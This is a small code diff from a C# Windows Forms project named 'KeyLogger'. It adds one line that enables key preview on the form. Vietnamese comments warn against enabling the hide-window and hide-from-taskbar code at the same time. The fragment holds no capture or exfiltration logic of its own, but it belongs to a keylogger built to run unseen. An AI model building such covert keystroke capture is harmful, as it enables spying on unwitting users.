@@ -71,6 +71,7 @@ namespace KeyLogger
         public Form1()
         {
             InitializeComponent();
+            this.KeyPreview = true;
             //                                 !!!CANH BAO!!!
             //  KHONG NEN CHAY CODE KHONG HIEN THI FORM VA CODE KHONG HIEN THI TREN TASKBAR CUNG LUC
             //  NEU LO CHAY 2 CODE TREN CUNG LUC, VO TASK-MANAGER -> XOA TIEN TRINH DANG CHAY TRONG VISUAL STUDIO, SAU DO VO COMMENT 2 DONG CODE VA BUILD LAI CHUONG TRINH
